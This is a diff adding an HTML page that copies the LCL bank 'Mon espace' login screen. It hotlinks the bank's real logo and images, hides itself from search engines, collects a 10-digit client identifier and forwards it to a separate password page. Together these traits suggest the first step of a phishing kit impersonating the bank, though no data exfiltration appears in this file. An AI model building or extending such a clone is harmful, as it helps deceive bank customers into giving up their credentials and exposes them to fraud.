@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html lang="fr-FR">
+<head>
+    <meta charset="UTF-8">
+    <title>LCL - Mon espace</title>
+    <base href=".">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noindex, nofollow">
+    <link rel="shortcut icon" href="https://monespace.lcl.fr/favicon.ico">
+    <style>
+        /* Styles de base */
+        :root {
+            --primary-color: #3b51d5;
+            --secondary-color: #f5f5f5;
+            --text-color: #202122;
+            --border-color: #ddd;
+            --shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            --transition: all 0.3s ease;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Montserrat', sans-serif;
+        }
+
+        html, body {
+            height: 100%;
+            width: 100%;
+            margin: 0;
+            padding: 0;
+            overflow-x: hidden;
+        }
+
+        body {
+            background-color: #f9f9f9;
+            color: var(--text-color);
+            line-height: 1.6;
+            background-image: url('https://monespace.lcl.fr/assets/images/login-page-background.jpg');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            position: relative;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.3);
+            z-index: -1;
+        }
+
+        /* Panneau de connexion */
+        .login-panel {
+            width: 500px;
+            background-color: white;
+            border-radius: 0;
+            box-shadow: var(--shadow);
+            padding: 40px;
+            min-height: 100vh;
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            overflow-y: auto;
+        }
+
+        .logo {
+            width: 120px;
+            margin-bottom: 40px;
+            display: block;
+        }
+
+        h2 {
+            font-size: 24px;
+            margin-bottom: 30px;
+            color: var(--primary-color);
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+        }
+
+        .identifier-input {
+            width: 100%;
+            max-width: 350px;
+            position: relative;
+        }
+
+        /* Nouvelle approche pour les traits et l'input */
+        .id-container {
+            position: relative;
+            width: 100%;
+            margin-bottom: 5px;
+            margin-top: 10px;
+        }
+
+        .strokes {
+            display: flex;
+            justify-content: center;
+            width: 100%;
+        }
+
+        .stroke-container {
+            position: relative;
+            margin-right: 10px;
+            width: 20px;
+        }
+
+        .stroke {
+            border-bottom: 1px solid #a5a5a5;
+            width: 100%;
+            position: absolute;
+            bottom: 0;
+        }
+
+        .stroke-filled {
+            border-color: #202122;
+        }
+
+        .stroke-activated {
+            border-color: var(--primary-color);
+        }
+
+        .input-wrapper {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+
+        .input {
+            background: none;
+            border: none;
+            box-sizing: border-box;
+            caret-color: var(--primary-color);
+            display: block;
+            font-family: inherit;
+            font-size: 18px;
+            font-weight: inherit;
+            width: 100%;
+            height: 30px;
+            outline: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            opacity: 0;
+        }
+
+        .digit-display {
+            display: flex;
+            width: 100%;
+            justify-content: center;
+        }
+
+        .digit {
+            width: 20px;
+            margin-right: 10px;
+            text-align: center;
+            font-size: 18px;
+        }
+
+        .input-group {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            margin-top: 20px;
+            justify-content: center;
+            width: 100%;
+            max-width: 350px;
+        }
+
+        .input-group input[type="checkbox"] {
+            margin-right: 12px;
+            width: 24px;
+            height: 24px;
+            cursor: pointer;
+            position: relative;
+            top: -1px;
+        }
+
+        .input-group label {
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        /* Style modifié pour les boutons */
+        .btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: var(--transition);
+            font-weight: bold;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 50%;
+            max-width: 220px;
+        }
+
+        .btn.disabled {
+            background-color: #e0e0e0;
+            color: #888;
+            cursor: not-allowed;
+        }
+
+        .btn:not(.disabled) {
+            background-color: var(--primary-color);
+            color: white;
+        }
+
+        .btn:not(.disabled):hover {
+            background-color: #2c3fb3;
+        }
+
+        .btn.primary {
+            background-color: var(--primary-color);
+            color: white;
+            width: 50%;
+            max-width: 220px;
+        }
+
+        .btn.primary:hover {
+            background-color: #2c3fb3;
+        }
+
+        .links-group {
+            margin-bottom: 30px;
+            text-align: center;
+            width: 100%;
+            max-width: 350px;
+        }
+
+        .link {
+            display: block;
+            color: var(--primary-color);
+            text-decoration: none;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+
+        .link:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            height: 1px;
+            background-color: var(--border-color);
+            margin: 20px 0;
+            width: 100%;
+            max-width: 350px;
+        }
+
+        h3 {
+            font-size: 18px;
+            margin-bottom: 15px;
+            text-align: center;
+            width: 100%;
+        }
+
+        .security-box {
+            background-color: #f8f9fa;
+            border: 1px solid var(--border-color);
+            border-radius: 0;
+            padding: 15px;
+            margin-top: 30px;
+            margin-bottom: 20px;
+            text-align: center;
+            width: 100%;
+            max-width: 350px;
+        }
+
+        .security-box h4 {
+            font-size: 16px;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .security-box p {
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+
+        /* Design responsive */
+        @media (max-width: 767px) {
+            .login-panel {
+                width: 100%;
+                padding: 40px 20px;
+            }
+            
+            .btn, .btn.primary {
+                width: 70%;
+            }
+        }
+
+        @media (min-width: 500px) {
+            .stroke-container {
+                margin-right: 15px;
+                width: 25px;
+            }
+            
+            .digit {
+                width: 25px;
+                margin-right: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-panel">
+        <img src="https://monespace.lcl.fr/assets/images/logo.svg" alt="LCL Logo" class="logo">
+        <h2>Votre identifiant</h2>
+        
+        <div class="form-group">
+            <div class="identifier-input">
+                <div class="id-container">
+                    <!-- Affichage des chiffres -->
+                    <div class="digit-display">
+                        <div class="digit" id="digit-0"></div>
+                        <div class="digit" id="digit-1"></div>
+                        <div class="digit" id="digit-2"></div>
+                        <div class="digit" id="digit-3"></div>
+                        <div class="digit" id="digit-4"></div>
+                        <div class="digit" id="digit-5"></div>
+                        <div class="digit" id="digit-6"></div>
+                        <div class="digit" id="digit-7"></div>
+                        <div class="digit" id="digit-8"></div>
+                        <div class="digit" id="digit-9"></div>
+                    </div>
+                    
+                    <!-- Traits sous les chiffres -->
+                    <div class="strokes">
+                        <div class="stroke-container">
+                            <div class="stroke stroke-activated" id="stroke-0"></div>
+                        </div>
+                        <div class="stroke-container">
+                            <div class="stroke" id="stroke-1"></div>
+                        </div>
+                        <div class="stroke-container">
+                            <div class="stroke" id="stroke-2"></div>
+                        </div>
+                        <div class="stroke-container">
+                            <div class="stroke" id="stroke-3"></div>
+                        </div>
+                        <div class="stroke-container">
+                            <div class="stroke" id="stroke-4"></div>
+                        </div>
+                        <div class="stroke-container">
+                            <div class="stroke" id="stroke-5"></div>
+                        </div>
+                        <div class="stroke-container">
+                            <div class="stroke" id="stroke-6"></div>
+                        </div>
+                        <div class="stroke-container">
+                            <div class="stroke" id="stroke-7"></div>
+                        </div>
+                        <div class="stroke-container">
+                            <div class="stroke" id="stroke-8"></div>
+                        </div>
+                        <div class="stroke-container">
+                            <div class="stroke" id="stroke-9"></div>
+                        </div>
+                    </div>
+                    
+                    <!-- Input caché pour la saisie -->
+                    <div class="input-wrapper">
+                        <input type="tel" id="user-id" name="user-id" autocomplete="off" 
+                               placeholder="" maxlength="10" pattern="[0-9]{10}" 
+                               class="input" required>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="input-group">
+            <input type="checkbox" id="remember">
+            <label for="remember">Mémoriser mon identifiant</label>
+        </div>
+        
+        <button id="continue-btn" class="btn disabled" disabled>Continuer <span>→</span></button>
+        
+        <div class="links-group">
+            <a href="#" class="link">Identifiant oublié ?</a>
+            <a href="#" class="link">Code personnel oublié ?</a>
+        </div>
+
+        <div class="divider"></div>
+
+        <h3>Pas encore client ?</h3>
+        <button class="btn primary">Ouvrir un compte <span>→</span></button>
+
+        <div class="security-box">
+            <h4>🔒 Nos conseils sécurité</h4>
+            <p>LCL ne vous sollicitera jamais pour vous demander de communiquer vos mots de passe ou codes confidentiels.</p>
+            <a href="#" class="link">Comment sécuriser mes données bancaires</a>
+        </div>
+    </div>
+
+    <script>
+        // Script pour activer/désactiver le bouton Continuer
+        document.addEventListener('DOMContentLoaded', function() {
+            const userIdInput = document.getElementById('user-id');
+            const continueBtn = document.getElementById('continue-btn');
+            const strokes = document.querySelectorAll('.stroke');
+            const digits = document.querySelectorAll('.digit');
+            
+            // Effacer le sessionStorage à chaque chargement de page
+            sessionStorage.removeItem('current_user_id');
+            
+            // S'assurer que l'input est vide au chargement
+            userIdInput.value = '';
+            
+            // Fonction pour valider l'identifiant
+            function validateUserId(id) {
+                // Vérifie si l'identifiant est composé de 10 chiffres
+                const regex = /^[0-9]{10}$/;
+                return regex.test(id);
+            }
+            
+            // Fonction pour mettre à jour les traits sous l'identifiant et afficher les chiffres
+            function updateDisplay(value) {
+                const length = value.length;
+                
+                // Réinitialiser tous les traits et chiffres
+                for (let i = 0; i < 10; i++) {
+                    const stroke = document.getElementById(`stroke-${i}`);
+                    const digit = document.getElementById(`digit-${i}`);
+                    
+                    if (i < length) {
+                        stroke.classList.add('stroke-filled');
+                        digit.textContent = value[i];
+                    } else {
+                        stroke.classList.remove('stroke-filled');
+                        digit.textContent = '';
+                    }
+                }
+            }
+            
+            // Fonction pour mettre à jour l'état du bouton
+            function updateButtonState() {
+                const userId = userIdInput.value.trim();
+                updateDisplay(userId);
+                
+                if (validateUserId(userId)) {
+                    continueBtn.classList.remove('disabled');
+                    continueBtn.disabled = false;
+                } else {
+                    continueBtn.classList.add('disabled');
+                    continueBtn.disabled = true;
+                }
+            }
+            
+            // Écouteurs d'événements
+            userIdInput.addEventListener('input', updateButtonState);
+            
+            // Focus sur l'input quand on clique sur le conteneur
+            document.querySelector('.id-container').addEventListener('click', function() {
+                userIdInput.focus();
+            });
+            
+            // Gestion du formulaire
+            continueBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                const userId = userIdInput.value.trim();
+                
+                if (validateUserId(userId)) {
+                    // Toujours stocker l'identifiant pour la page suivante
+                    sessionStorage.setItem('current_user_id', userId);
+                    
+                    // Stocker l'identifiant de façon permanente uniquement si la case est cochée
+                    if (document.getElementById('remember').checked) {
+                        localStorage.setItem('lcl_user_id', userId);
+                    } else {
+                        localStorage.removeItem('lcl_user_id');
+                    }
+                    
+                    // Redirection vers la page de mot de passe
+                    window.location.href = 'password.html';
+                }
+            });
+        });
+    </script>
+</body>
+</html>
